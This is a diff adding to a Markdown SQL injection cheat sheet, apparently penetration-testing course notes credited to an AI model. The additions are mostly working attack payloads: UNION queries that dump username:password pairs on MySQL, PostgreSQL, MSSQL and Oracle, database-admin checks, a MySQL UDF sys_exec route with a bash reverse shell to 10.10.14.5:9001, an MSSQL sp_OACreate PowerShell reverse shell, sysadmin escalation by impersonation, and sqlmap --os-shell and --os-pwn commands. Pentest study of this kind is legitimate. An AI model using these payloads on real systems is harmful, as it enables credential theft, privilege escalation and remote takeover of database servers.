@@ -1,6 +1,6 @@
 # SQL Injection
 
-#SQLi #SQLInjection #injection #WebAppAttacks
+#SQLi #SQLInjection #injection #WebAppAttacks #RCE #xp_cmdshell #UDF #DBA #OSShell
 
 ## What is this?
 
@@ -128,6 +128,22 @@ Replace NULLs with strings to find which columns are reflected in the response:
 ' UNION SELECT NULL,NULL,1-- -
 ```
 
+**Extract MANY rows in ONE request** — when the app only renders the *first* result row, aggregate every row into a single string instead of iterating with `LIMIT`:
+
+```sql
+-- MySQL: GROUP_CONCAT (default separator is comma; force newlines for readability)
+' UNION SELECT NULL,(SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a) FROM users),NULL-- -
+
+-- PostgreSQL / MSSQL: string_agg
+' UNION SELECT NULL,(SELECT string_agg(username||':'||password, chr(10)) FROM users),NULL-- -   -- PgSQL
+' UNION SELECT NULL,(SELECT STRING_AGG(username+':'+password, CHAR(10)) FROM users),NULL-- -    -- MSSQL 2017+
+
+-- Oracle: LISTAGG
+' UNION SELECT NULL,(SELECT LISTAGG(username||':'||password, chr(10)) WITHIN GROUP (ORDER BY username) FROM users),NULL FROM dual-- -
+```
+
+> [!tip] `GROUP_CONCAT` output is truncated at `group_concat_max_len` (default **1024 bytes**) — if the dump looks cut off, either raise it (`SET SESSION group_concat_max_len=1000000` where you have a stacked-query/privilege) or page with `LIMIT`/`OFFSET`.
+
 ---
 
 ## Database Enumeration (MySQL)
@@ -218,6 +234,31 @@ SHOW DATABASES;
 
 ## RCE via SQLi
 
+### Step 0 — Are you DBA? (that decides everything)
+
+Landing as a **DBA / superuser** is the whole game: it unlocks direct OS command execution, not just data theft. Confirm your role first, then take the matching path below.
+
+```sql
+-- MySQL — DBA ≈ FILE priv + writable plugin dir (needed for UDF)
+' UNION SELECT NULL,super_priv,NULL FROM mysql.user WHERE user=CURRENT_USER()-- -   -- 'Y' = SUPER
+' UNION SELECT NULL,@@secure_file_priv,NULL-- -                                    -- '' (empty) = can write anywhere
+-- MSSQL — 1 = sysadmin (full)
+'; SELECT IS_SRVROLEMEMBER('sysadmin')-- -
+-- PostgreSQL — 'on' = superuser
+'; SELECT current_setting('is_superuser')-- -    (or: SELECT usesuper FROM pg_user WHERE usename=current_user)
+-- Oracle — look for the DBA role
+' UNION SELECT granted_role,NULL FROM user_role_privs-- -
+```
+
+| DBMS | If you're DBA/superuser → OS command path | If you're **not** DBA |
+|---|---|---|
+| **MySQL/MariaDB** | **UDF `sys_exec`/`sys_eval`** (below) — direct exec; or `INTO OUTFILE` webshell if `FILE`+writable webroot | webshell write only (needs `FILE` + writable web dir) |
+| **MSSQL** | `xp_cmdshell` (re-enable it); `sp_OACreate` OLE if xp is locked | try to **regain sysadmin** (impersonation / TRUSTWORTHY, below) |
+| **PostgreSQL** | `COPY … FROM/TO PROGRAM` (below) | need `pg_execute_server_program` role or a `dblink`/FDW pivot |
+| **Oracle** | `DBMS_SCHEDULER.CREATE_JOB` (executable job) or `DBMS_JAVA` stored proc | limited to data extraction |
+
+> [!tip] Don't have DBA? Data extraction is still worth everything — you're hunting for **reused credentials** (app config, `users` table hashes) that log in *elsewhere* as a privileged OS/AD account. SQLi→OS-shell is the loud path; SQLi→creds→SSH is often the quiet one.
+
 ### MySQL → Webshell
 
 ```sql
@@ -233,6 +274,30 @@ SHOW DATABASES;
 > [!warning]
 > Don't write `$_GET[cmd]` with a bare, unquoted key. PHP 7.2 deprecated the undefined-constant fallback and **PHP 8.0 made it a fatal `Error`** — the shell dies on every request. You usually can't use `'cmd'` either, since the quotes collide with the SQL string delimiter. A numeric key (`$_REQUEST[0]`) sidesteps both; alternatively hex-encode the whole payload and use `INTO DUMPFILE 0x...`.
 
+### MySQL DBA → UDF `sys_exec` / `sys_eval` (direct command exec, no webroot)
+
+The webshell above needs a writable, web-served directory. As **DBA** you can instead get **direct OS command execution** by loading the `lib_mysqludf_sys` shared library into the plugin dir and registering its functions — no web server required. This is the real MySQL "turn it on" RCE, and it's exactly what `sqlmap --os-shell` automates for MySQL.
+
+**Preconditions:** `FILE` priv + `@@secure_file_priv` empty (write anywhere) + you can write to `@@plugin_dir`. Stacked queries (or a stacked-capable sink) make this far easier.
+
+```sql
+SELECT @@plugin_dir;                 -- where the .so/.dll must land, e.g. /usr/lib/mysql/plugin/
+SELECT @@version_compile_os;         -- lnx vs win → pick the right prebuilt library
+
+-- 1. Drop the precompiled UDF into the plugin dir (hex-encode the .so; DUMPFILE = binary-safe)
+'; SELECT 0x7f454c46...<lib_mysqludf_sys.so bytes>... INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so'-- -
+
+-- 2. Register the functions from the library
+'; CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so'-- -
+'; CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so'-- -
+
+-- 3. Execute — sys_eval returns stdout; sys_exec returns only the exit code (fire-and-forget)
+SELECT sys_eval('id');
+SELECT sys_exec('bash -c "bash -i >& /dev/tcp/10.10.14.5/9001 0>&1"');   -- reverse shell (pivot port)
+```
+
+> [!tip] The prebuilt library ships with both **sqlmap** (`/usr/share/sqlmap/data/udf/mysql/…` — XOR-encoded `.so_`/`.dll_`; sqlmap decodes and uploads it during `--os-shell`) and **Metasploit** (`mysql_udf_payload`). On Windows MySQL it's the matching `lib_mysqludf_sys.dll` into the install's `plugin` dir. Letting `sqlmap --os-shell` do the upload is almost always faster than hand-hexing the binary.
+
 ### MSSQL → xp_cmdshell
 
 ```sql
@@ -247,6 +312,30 @@ EXEC xp_cmdshell 'whoami';
 -- Check if already enabled
 SELECT value FROM sys.configurations WHERE name='xp_cmdshell'
 ```
+
+#### MSSQL — when `xp_cmdshell` is locked down
+
+**Fallback A — OLE Automation (`sp_OACreate`).** A separate feature toggle from xp_cmdshell, so it often survives when xp is hardened. Runs a command via `WScript.Shell` — but it's **blind** (no stdout back), so use it for a reverse shell / file drop, not for reading output:
+
+```sql
+'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;
+   EXEC sp_configure 'Ole Automation Procedures',1; RECONFIGURE;
+   DECLARE @o INT; EXEC sp_oacreate 'wscript.shell',@o OUT;
+   EXEC sp_oamethod @o,'run',NULL,'cmd /c "powershell -enc <b64 reverse shell>"'-- -
+```
+
+**Fallback B — you're not sysadmin (regain it).** `sp_configure` needs sysadmin, so first try to *become* sysadmin:
+
+```sql
+-- Impersonate a sysadmin login you can EXECUTE AS (enumerate IMPERSONATE grants first)
+'; EXECUTE AS LOGIN='sa'; SELECT IS_SRVROLEMEMBER('sysadmin')-- -
+-- db_owner on a TRUSTWORTHY database owned by a sysadmin → escalate to sysadmin:
+'; EXECUTE AS USER='dbo'; EXEC sp_addsrvrolemember 'yourlogin','sysadmin'-- -
+-- Linked server with rpcout enabled often runs as sa on the remote instance:
+'; EXEC('EXEC sp_configure ''xp_cmdshell'',1; RECONFIGURE') AT [LINKEDSRV]-- -
+```
+
+> [!tip] Enumerate impersonation/linked paths with the `IMPERSONATE`-grant and `sysservers` queries in [[Class notes/HTB Academy/CPTS v2 (claude)/Attacking Common Services|Attacking Common Services]] (MSSQL section) — the SQLi context and a direct `impacket-mssqlclient` login use the exact same escalation.
 
 ### PostgreSQL → COPY FROM PROGRAM (RCE)
 
@@ -382,7 +471,7 @@ Used when there's no visible response and time-based is unreliable. Exfil data v
 | **Sleep** | `SLEEP(5)` | `WAITFOR DELAY '0:0:5'` | `pg_sleep(5)` | `DBMS_LOCK.SLEEP(5)` |
 | **String concat** | `concat(a,0x3a,b)` | `a+b` | `a\|\|b` | `a\|\|b` |
 | **File read** | `LOAD_FILE('/etc/passwd')` | `BULK INSERT` / `OPENROWSET` | `COPY TO` | `UTL_FILE` |
-| **RCE** | `INTO OUTFILE` → webshell | `xp_cmdshell` | `COPY FROM PROGRAM` | `DBMS_SCHEDULER` / Java |
+| **RCE** | UDF `sys_exec` (DBA) / `INTO OUTFILE` webshell | `xp_cmdshell` / `sp_OACreate` OLE | `COPY … FROM PROGRAM` | `DBMS_SCHEDULER` / Java |
 
 ---
 
@@ -731,12 +820,21 @@ sqlmap -u "http://target.com/page?id=1" --file-write ./shell.php --file-dest /va
 ### OS shell / RCE
 
 ```bash
-# Interactive OS shell (MySQL/MSSQL/PostgreSQL)
+# Interactive OS shell — automates the per-DBMS path from "RCE via SQLi" above:
+#   MySQL/PostgreSQL → uploads a UDF / uses COPY FROM PROGRAM   MSSQL → auto-enables xp_cmdshell
 sqlmap -u "http://target.com/page?id=1" --os-shell
 
-# sqlmap shell (SQL-level)
+# Single command instead of an interactive shell
+sqlmap -u "http://target.com/page?id=1" --os-cmd "whoami"
+
+# OOB: pop a Meterpreter/VNC via Metasploit (needs msf; great when the shell is blind)
+sqlmap -u "http://target.com/page?id=1" --os-pwn
+
+# sqlmap shell (SQL-level, not OS)
 sqlmap -u "http://target.com/page?id=1" --sql-shell
 ```
+
+> [!note] `--os-shell` needs **DBA** and usually **stacked-query** support; add `--technique=E` or `--dbms`/`--web-root` hints if it struggles. Confirm privilege first: `--is-dba`, `--privileges`, `--current-user`. No DBA → `--os-shell` will fail; fall back to `--file-write` (webshell) or dump-and-reuse-creds.
 
 ### Tuning
 
@@ -871,5 +969,5 @@ What you're up against, and where each control still leaks — useful for the re
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-08-25*
+*Updated: 2026-09-02*
 *Model: claude-opus-5*
